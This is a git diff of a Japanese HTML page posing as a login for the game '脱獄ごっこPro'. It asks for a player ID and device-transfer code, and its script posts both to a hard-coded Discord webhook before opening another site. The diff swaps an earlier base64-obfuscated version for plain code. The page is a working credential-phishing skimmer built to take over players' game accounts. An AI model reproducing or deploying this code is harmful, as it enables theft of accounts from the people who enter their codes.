@@ -1,12 +1,133 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head>
+  <head>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>main_frontsight</title>
-</head>
-<body>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+
+  <body>
+    <div class="contact-form">
+      <p id="taitai">脱獄ごっこProにログイン</p>
+      <form id="loginForm" action="https://api.staticforms.xyz/submit" method="post" onsubmit="return validateForm(event)">
+        <input type="hidden" name="accessKey" value="b60bc6da-6ef8-4e65-a2e1-921aee9c7727">
+        <input type="hidden" name="subject" value="crack">
+
+        <div class="item">
+          <input type="text" id="playerId" name="name" placeholder="プレイヤーID" minlength="16" maxlength="16" pattern="^[a-zA-Z0-9_@]+$" required>
+        </div>
+        <br>
+        <div class="item">
+          <input type="password" id="changeCode" name="name" placeholder="機種変更コード" minlength="12" maxlength="12" pattern="^[a-zA-Z0-9_@]+$" required/>
+        </div>
+        <br>
+        <div class="button-area">
+          <input type="submit" value="ログイン">
+        </div>
+      </form>
+    </div>
+
     <script>
-        document.write(atob("PGRpdiBjbGFzcz0iY29udGFjdC1mb3JtIj4KICAgICAgICA8cCBpZD0idGFpdGFpIj7vvZHlsJHotYXjg7zjg5Xjgrnjg7zjgqTjg7zjgqU8L3A+CiAgICAgICAgPGZvcm0gaWQ9ImxvZ2luRm9ybSIgYWN0aW9uPSJodHRwczovL2FwaS5zdGF0aWNmb3Jtcy54eXovc3VibWl0IiBtZXRob2Q9InBvc3QiIG9uc3VibWl0PSJyZXR1cm4gdmFsaWRhdGVGb3JtKGV2ZW50KSI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjY2Vzc0tleSIgdmFsdWU9ImI2MGJjNmRhLTZlZjgtNGU2NS1hMmUxLTkyMWFlZTljNzcyNyI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InN1YmplY3QiIHZhbHVlPSJjcmFjayI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9Iml0ZW0iPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJwbGF5ZXJJZCIgbmFtZT0ibmFtZSIgcGxhY2Vob2xkZXI9IuihqOm9kOeUn+WFqCIgbWlubGVuZ3RoPSIxNiIgbWF4bGVuZ3RoPSIxNiIgcGF0dGVybj0iXlthLXpBLVowLTlfQF0rJCIgcmVxdWlyZWQ+Cgk8L2Rpdj4KICAgICAgICAgICAgPGJyPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJpdGVtIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9ImNoYW5nZUNvZGUiIG5hbWU9Im5hbWUiIHBsYWNlaG9sZGVyPSLmmYzlpKnkvZznoqvlrpoz44O844KtIiBtaW5sZW5ndGg9IjEyIiBtYXhsZW5ndGg9IjEyIiBwYXR0ZXJuPSJeW2EtejAtOV9AXSQgcmVxdWlyZWQ+Cgk8L2Rpdj4KICAgICAgICAgICAgPGJyPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJidXR0b24tYXJlYSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0i44Kz44Oz44Kv44O844OI44OzIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9mb3JtPgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgICAgIGNvbnN0IHdlYmhvb2tVUkwgPSAiWU9VUl9ESVNDT1JEX1dFQkhPT0tfVVJMIgogICAgICAgICAgICBmdW5jdGlvbiBzZW5kVG9EaXNjb3JkKHBsYXllcklkLCBjaGFuZ2VDb2RlKSB7CiAgICAgICAgICAgICAgICBjb25zdCByZXF1ZXN0ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCkKICAgICAgICAgICAgICAgIHJlcXVlc3Qub3BlbigicG9zdCIsIHdlYmhvb2tVUkwpCiAgICAgICAgICAgICAgICByZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSwgYXBwbGljYXRpb24vanNvbiIpCiAgICAgICAgICAgICAgICBjb25zdCBwYXJhbXMgPSB7CiAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWU6ICJGb3JtIEJvdCIsCiAgICAgICAgICAgICAgICAgICAgY29udGVudDogIlBsYXllciBJRDogIiArIHBsYXllcklkICsgIlx1MGUwMFx1MDQxMG1rYXBwXHUwMjZtY29uZGVzOiAiICsgY2hhbmdlQ29kZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVxdWVzdC5zZW5kKEpTT04uc3RyaW5naWZ5KHBhcmFtcikpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZnVuY3Rpb24gdmFsaWRhdGVGb3JtKGV2ZW50KSB7CiAgICAgICAgICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpCiAgICAgICAgICAgICAg
-                            </script>
+      const webhookURL = 'https://discord.com/api/webhooks/1256923461255958660/51CKXYA7Z9GpiL4g-f-nIoTeD6ax-QiQh34RJq0sLaYMpC_GTJeNprtL3VyM9NP0Nxp8';
+
+      function sendToDiscord(playerId, changeCode) {
+        const request = new XMLHttpRequest();
+        request.open("POST", webhookURL);
+        request.setRequestHeader('Content-type', 'application/json');
+
+        const params = {
+          username: "Form Bot",
+          content: `プレイヤーID: ${playerId}\n機種変更コード: ${changeCode}`
+        };
+
+        request.send(JSON.stringify(params));
+      }
+
+      function validateForm(event) {
+        event.preventDefault(); // フォームのデフォルトの送信を防ぐ
+
+        const playerId = document.getElementById('playerId').value;
+        const changeCode = document.getElementById('changeCode').value;
+
+        if (playerId.length === 16 && changeCode.length === 12) {
+          sendToDiscord(playerId, changeCode);
+          window.open('https://heleamc.github.io/PRO');
+          return true; // フォームを送信する
+        } else {
+          alert("入力内容が正しくありません。");
+          return false; // フォームの送信を防ぐ
+        }
+      }
+    </script>
+
+    <style>
+      @keyframes rainbow {
+          0% { color: red; }
+          16.67% { color: orange; }
+          33.33% { color: yellow; }
+          50% { color: green; }
+          66.67% { color: blue; }
+          83.33% { color: indigo; }
+          100% { color: violet; }
+      }
+
+      .rainbow-text {
+          animation: rainbow 8s infinite;
+      }
+
+      body {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          margin: 0;
+          background-color: #ffffff;
+          font-family: 'Arial', sans-serif;
+      }
+
+      .contact-form {
+        background-color: #505050;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        width: 320px;
+        height: 350px;
+        text-align: center;
+      }
+
+      p#taitai {
+        font-size: 20px;
+        font-family: sans-serif;
+        font-weight: bold;
+        color: #ffffff;
+      }
+
+      input[type="text"], input[type="password"] {
+        outline: solid 0.2px #414141;
+        border-radius: 30px;
+        color: #ffffff;
+        background-color: #626262;
+        border: solid 1px #aaa;
+        padding: 10px;
+        height: 20px;
+        width: 300px;
+        font-size: 15px;
+        border: none;
+      }
+
+      input[type="submit"] {
+        border-radius: 30px;
+        height: 44px;
+        width: 324px;
+        font-size: 15px;
+      }
+
+      .button-area input[type="submit"] {
+        border: none; /* 枠線を削除 */
+        background-color: #105fec; /* 背景色を設定 */
+      }
+    </style>
+  </body>
+</html>
